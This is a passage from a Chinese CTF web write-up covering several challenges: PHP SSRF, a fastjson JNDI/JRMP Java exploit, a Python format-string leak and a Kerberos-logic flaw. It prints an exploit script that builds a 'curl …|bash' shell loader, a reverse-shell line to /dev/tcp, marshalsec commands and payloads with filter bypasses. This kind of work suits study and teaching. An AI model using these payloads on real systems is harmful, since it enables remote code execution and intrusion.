class="line">    @mkdir($sandbox);</span><br><span class="line">    @chdir($sandbox);</span><br><span class="line">    if (isset($_POST[&apos;url&apos;])) &#123;</span><br><span class="line">        $url = $_POST[&apos;url&apos;];</span><br><span class="line">        if (filter_var($url, FILTER_VALIDATE_URL)) &#123;</span><br><span class="line">            if (preg_match(&apos;/(data:\/\/)|(&amp;)|(\|)|(\.\/)/i&apos;, $url)) &#123;</span><br><span class="line">                echo &quot;you are hacker&quot;;</span><br><span class="line">            &#125; else &#123;</span><br><span class="line">                $res = parse_url($url);</span><br><span class="line">                if (preg_match(&apos;/127\.0\.0\.1$/&apos;, $res[&apos;host&apos;])) &#123;</span><br><span class="line">                    $code = file_get_contents($url);</span><br><span class="line">                    if (strlen($code) &lt;= 4) &#123;</span><br><span class="line">                        @exec($code);</span><br><span class="line">                    &#125; else &#123;</span><br><span class="line">                        echo &quot;try again&quot;;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            echo &quot;invalid url&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        highlight_file(__FILE__);</span><br><span class="line">    &#125;</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    die(&apos;只有管理员才能看到我哟&apos;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>Hitcon的题，不过需要想办法绕过前面的</p>
<p>一开始还想通过访问<code>profile.php</code>，设置sign值来执行命令，但发现并不能携带cookie。gopher协议也是因为<code>file_get_contents()</code>无法<code>urldecode</code>无法携带cookie。卡了很久后大佬提供了一个绕过方式<br><code>compress.zlib://data:@127.0.0.1/plain;base64,</code><br>我的SSRF太菜了Orz，这里记一下<br>协议被过滤可以尝试使用<code>compress.bzip2://</code>或<code>compress.zlib://</code>搭载在其它协议的前面进行绕过</p>
<p>于是上脚本getshell得到flag</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"># -*-coding:utf8-*-</span><br><span class="line">import requests as r</span><br><span class="line">from time import sleep</span><br><span class="line">import random</span><br><span class="line">import hashlib</span><br><span class="line">import base64</span><br><span class="line"></span><br><span class="line">target = &apos;http://121.36.222.22:88/&apos;</span><br><span class="line"></span><br><span class="line">cookies = &#123;&apos;PHPSESSID&apos;: &apos;34249cec09642c9143355bcce08270bc&apos;&#125;</span><br><span class="line">page = &quot;core/index.php&quot;</span><br><span class="line"></span><br><span class="line">payload = [</span><br><span class="line">    # generate &quot;g&gt; ht- sl&quot; to file &quot;v&quot;</span><br><span class="line">    &apos;&gt;dir&apos;, </span><br><span class="line">    &apos;&gt;sl&apos;, </span><br><span class="line">    &apos;&gt;g\&gt;&apos;,</span><br><span class="line">    &apos;&gt;ht-&apos;,</span><br><span class="line">    &apos;*&gt;v&apos;,</span><br><span class="line"></span><br><span class="line">    # reverse file &quot;v&quot; to file &quot;x&quot;, content &quot;ls -th &gt;g&quot;</span><br><span class="line">    &apos;&gt;rev&apos;,</span><br><span class="line">    &apos;*v&gt;x&apos;,</span><br><span class="line"></span><br><span class="line">    # generate &quot;curl xxx.xx.xxx.x:xxxx|bash&quot;</span><br><span class="line">    &apos;&gt;\;\\&apos;, </span><br><span class="line">    &apos;&gt;sh\\&apos;, </span><br><span class="line">    &apos;&gt;ba\\&apos;, </span><br><span class="line">    &apos;&gt;\|\\&apos;, </span><br><span class="line">    &apos;&gt;xx\\&apos;,</span><br><span class="line">    &apos;&gt;xx\\&apos;,</span><br><span class="line">    &apos;&gt;x:\\&apos;, </span><br><span class="line">    &apos;&gt;x.\\&apos;, </span><br><span class="line">    &apos;&gt;xx\\&apos;,</span><br><span class="line">    &apos;&gt;x.\\&apos;, </span><br><span class="line">    &apos;&gt;x\\&apos;, </span><br><span class="line">    &apos;&gt;x.\\&apos;, </span><br><span class="line">    &apos;&gt;xx\\&apos;, </span><br><span class="line">    &apos;&gt;\ \\&apos;, </span><br><span class="line">    &apos;&gt;rl\\&apos;, </span><br><span class="line">    &apos;&gt;cu\\&apos;, </span><br><span class="line"></span><br><span class="line">    # got shell</span><br><span class="line">    &apos;sh x&apos;, </span><br><span class="line">    &apos;sh g&apos;, </span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">for i in payload:</span><br><span class="line">    i = i.encode()</span><br><span class="line">    cmd = base64.b64encode(i)</span><br><span class="line">    cmd = cmd.decode()</span><br><span class="line">    data = &#123;</span><br><span class="line">        &quot;url&quot;: &quot;compress.zlib://data:@127.0.0.1/plain;base64,&#123;&#125;&quot;.format(cmd)</span><br><span class="line">    &#125;</span><br><span class="line">    print(data)</span><br><span class="line">    s = r.post(target + page, cookies=cookies, data=data)</span><br><span class="line">    print(s.text)</span><br><span class="line"></span><br><span class="line">print(s.text)</span><br></pre></td></tr></table></figure>
<h2 id="baby-java"><a href="#baby-java" class="headerlink" title="baby_java"></a>baby_java</h2><p>Java题莫得环境只能列点了</p>
<p>首先是一个XXE，能打拿到使用的依赖</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br></pre></td><td class="code"><pre><span class="line">Method%uFF1A post </span><br><span class="line">Path %uFF1A /you_never_know_the_path</span><br><span class="line"></span><br><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;project xmlns=&quot;http://maven.apache.org/POM/4.0.0&quot; xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot; xsi:schemaLocation=&quot;http://maven.apache.org/POM/4.0.0 https://maven.apache.org/xsd/maven-4.0.0.xsd&quot;&gt;</span><br><span class="line">	&lt;modelVersion&gt;4.0.0&lt;/modelVersion&gt;</span><br><span class="line">	&lt;parent&gt;</span><br><span class="line">		&lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;</span><br><span class="line">		&lt;artifactId&gt;spring-boot-starter-parent&lt;/artifactId&gt;</span><br><span class="line">		&lt;version&gt;2.2.4.RELEASE&lt;/version&gt;</span><br><span class="line">		&lt;relativePath/&gt;&lt;!-- lookup parent from repository --&gt;</span><br><span class="line">	&lt;/parent&gt;</span><br><span class="line">	&lt;groupId&gt;com.tr1ple&lt;/groupId&gt;</span><br><span class="line">	&lt;artifactId&gt;sus&lt;/artifactId&gt;</span><br><span class="line">	&lt;version&gt;0.0.1-SNAPSHOT&lt;/version&gt;</span><br><span class="line">	&lt;name&gt;baby_java&lt;/name&gt;</span><br><span class="line">	&lt;description&gt;Spring Boot&lt;/description&gt;</span><br><span class="line"></span><br><span class="line">	&lt;properties&gt;</span><br><span class="line">		&lt;java.version&gt;1.8&lt;/java.version&gt;</span><br><span class="line">	&lt;/properties&gt;</span><br><span class="line">	&lt;dependencies&gt;</span><br><span class="line">		&lt;dependency&gt;</span><br><span class="line">			&lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;</span><br><span class="line">			&lt;artifactId&gt;spring-boot-starter&lt;/artifactId&gt;</span><br><span class="line">		&lt;/dependency&gt;</span><br><span class="line">		&lt;dependency&gt;</span><br><span class="line">			&lt;groupId&gt;org.apache.commons&lt;/groupId&gt;</span><br><span class="line">			&lt;artifactId&gt;commons-configuration2&lt;/artifactId&gt;</span><br><span class="line">			&lt;version&gt;2.2&lt;/version&gt;</span><br><span class="line">		&lt;/dependency&gt;</span><br><span class="line">		&lt;dependency&gt;</span><br><span class="line">			&lt;groupId&gt;org.aspectj&lt;/groupId&gt;</span><br><span class="line">			&lt;artifactId&gt;aspectjweaver&lt;/artifactId&gt;</span><br><span class="line">			&lt;version&gt;1.9.5&lt;/version&gt;</span><br><span class="line">		&lt;/dependency&gt;</span><br><span class="line">		&lt;dependency&gt;</span><br><span class="line">			&lt;groupId&gt;org.aspectj&lt;/groupId&gt;</span><br><span class="line">			&lt;artifactId&gt;aspectjtools&lt;/artifactId&gt;</span><br><span class="line">			&lt;version&gt;1.9.5&lt;/version&gt;</span><br><span class="line">		&lt;/dependency&gt;</span><br><span class="line">		&lt;dependency&gt;</span><br><span class="line">			&lt;groupId&gt;saxpath&lt;/groupId&gt;</span><br><span class="line">			&lt;artifactId&gt;saxpath&lt;/artifactId&gt;</span><br><span class="line">			&lt;version&gt;1.0-FCS&lt;/version&gt;</span><br><span class="line">		&lt;/dependency&gt;</span><br><span class="line">		&lt;dependency&gt;</span><br><span class="line">			&lt;groupId&gt;commons-configuration&lt;/groupId&gt;</span><br><span class="line">			&lt;artifactId&gt;commons-configuration&lt;/artifactId&gt;</span><br><span class="line">			&lt;version&gt;1.6&lt;/version&gt;</span><br><span class="line">		&lt;/dependency&gt;</span><br><span class="line">		&lt;dependency&gt;</span><br><span class="line">			&lt;groupId&gt;commons-lang&lt;/groupId&gt;</span><br><span class="line">			&lt;artifactId&gt;commons-lang&lt;/artifactId&gt;</span><br><span class="line">			&lt;version&gt;2.5&lt;/version&gt;</span><br><span class="line">		&lt;/dependency&gt;</span><br><span class="line">		&lt;dependency&gt;</span><br><span class="line">			&lt;groupId&gt;org.apache.flex.blazeds&lt;/groupId&gt;</span><br><span class="line">			&lt;artifactId&gt;flex-messaging-core&lt;/artifactId&gt;</span><br><span class="line">			&lt;version&gt;4.7.3&lt;/version&gt;</span><br><span class="line">		&lt;/dependency&gt;</span><br><span class="line">		&lt;dependency&gt;</span><br><span class="line">			&lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;</span><br><span class="line">			&lt;artifactId&gt;spring-boot-starter-web&lt;/artifactId&gt;</span><br><span class="line">		&lt;/dependency&gt;</span><br><span class="line">		&lt;dependency&gt;</span><br><span class="line">			&lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;</span><br><span class="line">			&lt;artifactId&gt;spring-boot-starter-thymeleaf&lt;/artifactId&gt;</span><br><span class="line">		&lt;/dependency&gt;</span><br><span class="line">		&lt;dependency&gt;</span><br><span class="line">			&lt;groupId&gt;com.alibaba&lt;/groupId&gt;</span><br><span class="line">			&lt;artifactId&gt;fastjson&lt;/artifactId&gt;</span><br><span class="line">			&lt;version&gt;1.2.48&lt;/version&gt;</span><br><span class="line">		&lt;/dependency&gt;</span><br><span class="line">		&lt;dependency&gt;</span><br><span class="line">			&lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;</span><br><span class="line">			&lt;artifactId&gt;spring-boot-starter-test&lt;/artifactId&gt;</span><br><span class="line">			&lt;scope&gt;test&lt;/scope&gt;</span><br><span class="line">			&lt;exclusions&gt;</span><br><span class="line">				&lt;exclusion&gt;</span><br><span class="line">					&lt;groupId&gt;org.junit.vintage&lt;/groupId&gt;</span><br><span class="line">					&lt;artifactId&gt;junit-vintage-engine&lt;/artifactId&gt;</span><br><span class="line">				&lt;/exclusion&gt;</span><br><span class="line">			&lt;/exclusions&gt;</span><br><span class="line">		&lt;/dependency&gt;</span><br><span class="line">		&lt;dependency&gt;</span><br><span class="line">			&lt;groupId&gt;commons-collections&lt;/groupId&gt;</span><br><span class="line">			&lt;artifactId&gt;commons-collections&lt;/artifactId&gt;</span><br><span class="line">			&lt;version&gt;3.1&lt;/version&gt;</span><br><span class="line">		&lt;/dependency&gt;</span><br><span class="line">	&lt;/dependencies&gt;</span><br><span class="line">	&lt;build&gt;</span><br><span class="line">		&lt;plugins&gt;</span><br><span class="line">			&lt;plugin&gt;</span><br><span class="line">				&lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;</span><br><span class="line">				&lt;artifactId&gt;spring-boot-maven-plugin&lt;/artifactId&gt;</span><br><span class="line">			&lt;/plugin&gt;</span><br><span class="line">		&lt;/plugins&gt;</span><br><span class="line">	&lt;/build&gt;</span><br><span class="line">&lt;/project&gt;</span><br></pre></td></tr></table></figure>
<p>这里利用fastjson(&lt;=1.2.61)的JNDI注入漏洞</p>
<p><a href="https://curz0n.github.io/2019/09/24/fastjson_1_2_61_blacklist_bypass/" target="_blank" rel="noopener">fastjson 1.2.61远程代码执行漏洞分析&amp;复现</a></p>
<p><code>{&quot;@type&quot;:&quot;org.apache.commons.configuration2.JNDIConfiguration&quot;,&quot;prefix&quot;:&quot;rmi://ip:port/Exploit&quot;}</code></p>
<p>这样进行利用即可，这里由于过滤了type，用<code>\x74ype</code>代替。prefix的过滤则是利用fastjson中parseField函数会去掉字符串中的<code>-</code>和开头的<code>_</code>，于是添加一个<code>-</code>或者<code>_</code>即可绕过</p>
<p>由于有<code>commons collections3.1</code>，直接远程开个JRMP弹shell即可</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">	&lt;groupId&gt;commons-collections&lt;/groupId&gt;</span><br><span class="line">	&lt;artifactId&gt;commons-collections&lt;/artifactId&gt;</span><br><span class="line">	&lt;version&gt;3.1&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure>
<p>为了本地复现这个漏洞前前后后整spring框架这些整了快一个星期，最后还是因为高版本 Java中会被<code>trustURLCodebase</code>拦截，最终复现失败Orz</p>
<p>不过java小白这里还是记一下JRMP的弹shell方式<br>将编译好的恶意class放到tomcat的<code>/webapps/ROOT/WEB-INF/classes/</code>目录下，classes目录要自己创建</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">public class Exploit &#123;</span><br><span class="line">    public Exploit()&#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            Runtime.getRuntime().exec(&quot;calc&quot;);</span><br><span class="line">            // java.lang.Runtime.getRuntime().exec(</span><br><span class="line">            //         new String[]&#123;&quot;bash&quot;, &quot;-c&quot;, &quot;bash -i &gt;&amp; /dev/tcp/192.168.85.128/4545 0&gt;&amp;1&quot;&#125;);</span><br><span class="line">        &#125; catch(Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    public static void main(String[] argv)&#123;</span><br><span class="line">        Exploit e = new Exploit();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>然后<code>web.xml</code>中配置class的访问路径(这里的<code>.class</code>可能是不需要的)</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;servlet&gt;</span><br><span class="line">      &lt;servlet-name&gt;Exploit&lt;/servlet-name&gt;</span><br><span class="line">      &lt;servlet-class&gt;Exploit&lt;/servlet-class&gt;</span><br><span class="line">&lt;/servlet&gt;</span><br><span class="line">&lt;servlet-mapping&gt;</span><br><span class="line">      &lt;servlet-name&gt;Exploit&lt;/servlet-name&gt;</span><br><span class="line">      &lt;url-pattern&gt;/Exploit.class&lt;/url-pattern&gt;</span><br><span class="line">&lt;/servlet-mapping&gt;</span><br></pre></td></tr></table></figure>
<p>然后下载<a href="https://github.com/mbechler/marshalsec" target="_blank" rel="noopener">marshalsec</a><br>使用maven安装<code>mvn clean package -DskipTests</code><br>装完后就可以启用rmi或者ladp服务，然后让目标机访问即可</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer http://127.0.0.1/#Exploit 1099</span><br><span class="line">java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://127.0.0.1/#Exploit 1389</span><br></pre></td></tr></table></figure>
<h2 id="fmkq"><a href="#fmkq" class="headerlink" title="fmkq"></a>fmkq</h2><p>进入是源码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">if(isset($_GET[&apos;head&apos;])&amp;&amp;isset($_GET[&apos;url&apos;]))&#123;</span><br><span class="line">    $begin = &quot;The number you want: &quot;;</span><br><span class="line">    extract($_GET);</span><br><span class="line">    if($head == &apos;&apos;)&#123;</span><br><span class="line">        die(&apos;Where is your head?&apos;);</span><br><span class="line">    &#125;</span><br><span class="line">    if(preg_match(&apos;/[A-Za-z0-9]/i&apos;,$head))&#123;</span><br><span class="line">        die(&apos;Head can\&apos;t be like this!&apos;);</span><br><span class="line">    &#125;</span><br><span class="line">    if(preg_match(&apos;/log/i&apos;,$url))&#123;</span><br><span class="line">        die(&apos;No No No&apos;);</span><br><span class="line">    &#125;</span><br><span class="line">    if(preg_match(&apos;/gopher:|file:|phar:|php:|zip:|dict:|imap:|ftp:/i&apos;,$url))&#123;</span><br><span class="line">        die(&apos;Don\&apos;t use strange protocol!&apos;);</span><br><span class="line">    &#125;</span><br><span class="line">    $funcname = $head.&apos;curl_init&apos;;</span><br><span class="line"></span><br><span class="line">    $ch = $funcname();</span><br><span class="line">    if($ch)&#123;</span><br><span class="line">        curl_setopt($ch, CURLOPT_URL, $url);</span><br><span class="line">        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);</span><br><span class="line">        $output = curl_exec($ch);</span><br><span class="line">        curl_close($ch);</span><br><span class="line">    &#125;</span><br><span class="line">    else&#123;</span><br><span class="line">        $output = &apos;rua&apos;;</span><br><span class="line">    &#125;</span><br><span class="line">    echo sprintf($begin.&apos;%d&apos;,$output);</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">    show_source(__FILE__);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>过滤了各种协议，<code>head</code>的值需要连接<code>curl_init</code>后不影响函数执行，同时<code>output</code>的输出值只会为int型需要绕过<br>通过fuzz发现<code>\</code>不会影响，好像是命名空间的原因，所有内置函数都于根目录下<br><code>sprintf()</code>可以通过<code>extract()</code>对<code>begin</code>进行变量覆盖为<code>%s%</code>，使后面的<code>%d</code>无效，<code>output</code>以string型输出</p>
<p>搞定这两个后一直在找怎么绕过，但好像并没用什么绕过的好方法。没想到这题又是要扫内网<br>扫端口可以发现8080端口能够使用</p>
<p><img src="http://shifeng-kaze.cn/blog/GXZY_web_wp/077893f2ac8f8db6880077a5d779c7f9.png" alt=""></p>
<p>当为vip时可以读取任意文件，非vip则只能读取<code>/tmp/</code>目录下的文件。这里<code>{file}</code>提示的是python的格式化字符串漏洞了</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">class a:</span><br><span class="line">	a = &quot;a&quot;</span><br><span class="line">	b = &quot;b&quot;</span><br><span class="line">a = a()</span><br><span class="line">b = &quot;hello &#123;c.a&#125; and &#123;c.b&#125;&quot;.format(c=a)</span><br><span class="line">print b</span><br></pre></td></tr></table></figure>
<p>一个简单的小栗子<br>输出为：<code>hello a and b</code><br>这里由于通过<code>format()</code>对c注入了对象a，于是<code>{}</code>中的<code>c.a</code>和<code>c.b</code>就是对象a中的属性a和b</p>
<p>这题中后端注入的是file，但不知道里面有什么，于是用<code>{file.__dict__}</code>遍历对象<br><code>{&#39;vipcode&#39;:&#39;0&#39;,&#39;file&#39;:,&#39;vip&#39;:}</code><br>然后再<code>{file.vip.__dict__}</code>遍历一下vip<br><code>{&#39;truevipcode&#39;:&#39;JacnmgC5EQPDfYUTvON9iowsVe3210zWXlMZ6ISKFhtqbrjy&#39;}</code><br>获得真vip的vipcode值</p>
<p><code>?head=\&amp;begin=%s%&amp;url=http://127.0.0.1:8080/read/file=/%26vipcode=JacnmgC5EQPDfYUTvON9iowsVe3210zWXlMZ6ISKFhtqbrjy</code><br>扫根目录，得知flag在<code>fl4g_1s_h3re_u_wi11_rua</code>目录下但无法读取</p>
<p>于是拿一下源码，读到<code>readfile.py</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">current_folder_file = [] </span><br><span class="line">class vipreadfile(): </span><br><span class="line">	def __init__(self,readfile): </span><br><span class="line">		self.filename = readfile.GetFileName() </span><br><span class="line">		self.path = os.path.dirname(os.path.abspath(self.filename)) </span><br><span class="line">		self.file = File(os.path.basename(os.path.abspath(self.filename)))</span><br><span class="line">		global current_folder_file </span><br><span class="line">		try:</span><br><span class="line">			current_folder_file = os.listdir(self.path) </span><br><span class="line">		except: </span><br><span class="line">			current_folder_file = current_folder_file </span><br><span class="line"></span><br><span class="line">	def __str__(self): </span><br><span class="line">		if &apos;fl4g&apos; in self.path: </span><br><span class="line">			return &apos;nonono,this folder is a secret!!!&apos; </span><br><span class="line">		else:</span><br><span class="line">			output = &apos;&apos;&apos;Welcome,dear vip! Here are what you want:\r\nThe file you read is:\r\n&apos;&apos;&apos; </span><br><span class="line">			filepath = (self.path + &apos;/&#123;vipfile&#125;&apos;).format(vipfile=self.file) </span><br><span class="line">			output += filepath </span><br><span class="line">			output += &apos;\r\n\r\nThe content is:\r\n&apos; </span><br><span class="line">			try:</span><br><span class="line">				f = open(filepath,&apos;r&apos;) </span><br><span class="line">				content = f.read() </span><br><span class="line">				f.close() </span><br><span class="line">			except: </span><br><span class="line">				content = &apos;can\&apos;t read&apos; </span><br><span class="line">			output += content </span><br><span class="line">			output += &apos;\r\n\r\nOther files under the same folder:\r\n&apos; </span><br><span class="line">			output += &apos; &apos;.join(current_folder_file) </span><br><span class="line">			return output</span><br></pre></td></tr></table></figure>
<p>可以看到这里<code>filepath</code>又用了一次格式字符串，注入的<code>self.file</code>为文件名，而过滤的是路径中的fl4g<br>要读取的路径是<code>/fl4g_1s_h3re_u_wi11_rua/flag</code>，<code>self.file</code>的值就为flag，于是取<code>self.file[0]</code>得到f接在路径上，这样就能绕过fl4g的检查</p>
<p>于是payload：<br><code>?head=\&amp;begin=%s%&amp;url=http://127.0.0.1:8080/read/file=/{vipfile[0]}l4g_1s_h3re_u_wi11_rua/flag%26vipcode=JacnmgC5EQPDfYUTvON9iowsVe3210zWXlMZ6ISKFhtqbrjy</code><br>我觉得应该是这样，但看大佬的payload是<code>{vipfile.file[0]}</code>，但<code>vipfile</code>不是本身就是文件名了吗？</p>
<p>还有一种方式是取读到全局变量<code>current_folder_file</code><br><code>/{vipfile.__class__.__init__.__globals__[current_folder_file] [21]}/flag</code><br>由于路径错误出错，<code>current_folder_file</code>值依旧是扫根目录的文件名集。<code>fl4g_1s_h3re_u_wi11_rua</code>为第22个文件，于是就能读到<code>/fl4g_1s_h3re_u_wi11_rua/flag</code></p>
<h2 id="dooog"><a href="#dooog" class="headerlink" title="dooog"></a>dooog</h2><p>这题是模拟了一个kerberos认证，了解kerberos认证做起来会快一些<br><a href="https://blog.csdn.net/sky_jiangcheng/article/details/81070240" target="_blank" rel="noopener">kerberos认证原理—讲的非常细致，易懂</a></p>
<p>这题的问题出在这里</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">if int(time.time()) - data[&apos;timestamp&apos;] &lt; 60:</span><br><span class="line">	if cmd not in [&apos;whoami&apos;, &apos;ls&apos;]:</span><br><span class="line">		return &apos;cmd error&apos;</span><br></pre></td></tr></table></figure>
<p>这里限制<code>timestamp</code>未超时时，cmd只能为<code>whoamin</code>和<code>ls</code>。但却没有对超时进行判断，那只需要在超时后再发出请求即可执行命令</p>
<p>于是看整一个kerberos认证流程</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">def register():</span><br><span class="line">    if request.method == &apos;POST&apos;:</span><br><span class="line">        username = request.form.get(&apos;username&apos;)</span><br><span class="line">        master_key = request.form.get(&apos;master_key&apos;)</span><br><span class="line">        new_user = User(username=username, master_key=master_key)</span><br><span class="line">        db.session.add(new_user)</span><br><span class="line">        db.session.commit()</span><br><span class="line">        return str(new_user.id)</span><br></pre></td></tr></table></figure>
<p>现先向KDC发送<code>username</code>和<code>master_key</code>，KDC端会保存<code>username</code>和<code>master_key</code></p>
